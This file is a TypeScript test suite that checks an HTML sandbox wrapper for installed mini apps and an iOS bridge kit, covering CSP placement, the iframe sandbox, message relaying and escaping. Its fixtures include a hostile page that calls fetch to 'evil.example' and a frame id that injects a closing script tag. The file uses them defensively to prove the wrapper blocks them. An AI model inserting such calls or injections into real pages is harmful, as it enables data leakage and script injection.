import { readFileSync, writeFileSync } from "node:fs";
import { describe, expect, it } from "vitest";

import { ARTIFACT_CSP } from "@/components/HtmlArtifact";
import { APP_BRIDGE } from "./app-kit";
import { miniAppDocument, miniAppHostDocument, miniAppNativeKit } from "./mini-app";

const unescape = (attr: string) => attr.replace(/&lt;/g, "<").replace(/&quot;/g, '"').replace(/&amp;/g, "&");
const innerOf = (host: string) => unescape(/srcdoc="([^"]*)"/.exec(host)![1]!);

describe("installed app documents", () => {
  const hostile = `<!doctype html><html><head><meta http-equiv="Content-Security-Policy" content="default-src *"><script>fetch("https://evil.example")</script></head><body>"&amp;</body></html>`;

  it("puts the no-network policy before anything the app wrote", () => {
    const doc = miniAppDocument(hostile, "f1");
    expect(doc.startsWith(`<!doctype html><meta http-equiv="Content-Security-Policy" content="${ARTIFACT_CSP}">`)).toBe(true);
    expect(doc.indexOf(ARTIFACT_CSP)).toBeLessThan(doc.indexOf("default-src *"));
    expect(doc.indexOf("RTCPeerConnection")).toBeLessThan(doc.indexOf("evil.example"));
    expect(doc.match(/<!doctype/gi)).toHaveLength(1);
  });

  it("carries the app byte for byte inside an escaped srcdoc", () => {
    const host = miniAppHostDocument(hostile, "f1");
    expect(innerOf(host)).toBe(miniAppDocument(hostile, "f1"));
    expect(host).toContain(`<iframe sandbox="allow-scripts" referrerpolicy="no-referrer" allow="" srcdoc="`);
    expect(host).not.toContain("allow-same-origin");
    expect(host).toMatch(/^<!doctype html><meta http-equiv="Content-Security-Policy" content="default-src 'none';[^"]*frame-src about:;/);
  });

  it("relays only this tab's messages, and only from the sandboxed child or the tab", () => {
    const host = miniAppHostDocument("<p>x</p>", "frame-9");
    expect(host).toContain(`ID="frame-9"`);
    expect(host).toContain(`d.bosCanvas!==ID)return`);
    expect(host).toContain(`e.source===child.contentWindow&&e.origin==="null"`);
    expect(host).toContain(`e.source===parent`);
  });

  it("can't be closed early by a script tag in the frame id", () => {
    const host = miniAppHostDocument("<p>x</p>", "</script><script>alert(1)//");
    expect(host.match(/<\/script/gi)).toHaveLength(1);
    expect(host.endsWith("</script>")).toBe(true);
  });

  it("gives installed apps the same records-only bridge as pages bos wrote", () => {
    expect(APP_BRIDGE).toContain("var bos={");
    expect(miniAppDocument("<p>x</p>", "f")).toContain("var bos={");
    expect(miniAppDocument("<p>x</p>", "f")).not.toContain(`"ask"`);
  });
});

describe("the iphone's mini app kit", () => {
  // the phone bundles this file; UPDATE_IOS_KIT=1 rewrites it after a kit change
  const path = new URL("../../../ios/Sources/CompanionCore/Resources/mini-app-kit.json", import.meta.url);
  const kit = miniAppNativeKit();

  it("posts to the native handler, never a parent frame", () => {
    expect(kit.bridge).toContain("window.webkit.messageHandlers.bos.postMessage(m)");
    expect(kit.bridge).not.toContain("parent.postMessage");
    expect(kit.bridge).toContain("var ID=__ID__");
    expect(kit.csp).toBe(ARTIFACT_CSP);
    expect(kit.noRtc).toContain("RTCPeerConnection");
  });

  it("matches the copy in the ios app", () => {
    const json = JSON.stringify(kit, null, 2) + "\n";
    if (process.env.UPDATE_IOS_KIT) writeFileSync(path, json);
    expect(readFileSync(path, "utf8")).toBe(json);
  });
});
